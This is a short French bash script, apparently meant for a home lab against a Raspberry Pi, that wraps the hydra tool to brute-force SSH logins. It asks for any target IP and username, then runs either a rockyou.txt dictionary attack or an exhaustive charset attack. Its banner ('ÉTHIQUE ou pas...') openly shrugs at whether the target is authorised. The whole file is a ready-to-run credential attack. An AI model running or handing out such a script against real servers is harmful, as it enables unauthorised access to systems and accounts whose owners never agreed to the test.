clear
echo "🎯 LAB DE BRUTE-FORCE SSH (ÉTHIQUE ou pas...)"
echo "-----------------------------------"
read -p "👉 Entre l'adresse IP de la machine cible (RPi3) : " IP

echo ""
read -p "👤 Nom d'utilisateur SSH cible (ex: testuser) : " USER

echo ""
echo "🔍 Choisis le type d'attaque :"
echo "1. Dictionnaire (rockyou.txt)"
echo "2. Brute-force complet (lent)"
read -p "Ton choix (1 ou 2) : " MODE

WORDLIST="/usr/share/wordlists/rockyou.txt"

echo ""
if [[ "$MODE" == "1" ]]; then
    echo "🚀 Lancement de l'attaque par dictionnaire..."
    echo ""
    hydra -l $USER -P $WORDLIST ssh://$IP -t 4
elif [[ "$MODE" == "2" ]]; then
    echo "⚠️ Attention : attaque brute-force longue !"
    echo "Exemple : min=1, max=4, charset=a1 (a-z et chiffres)"
    read -p "Charset (ex: aA1 pour lettres/chiffres) : " CHARSET
    read -p "Longueur min : " MIN
    read -p "Longueur max : " MAX
    echo ""
    echo "🚀 Lancement de l'attaque brute-force..."
    hydra -l $USER -x $MIN:$MAX:$CHARSET -t 4 ssh://$IP
else
    echo "❌ Choix invalide. Relance le script."
    exit 1
fi

echo ""
echo "✅ Fin du test. Consulte les résultats ci-dessus."
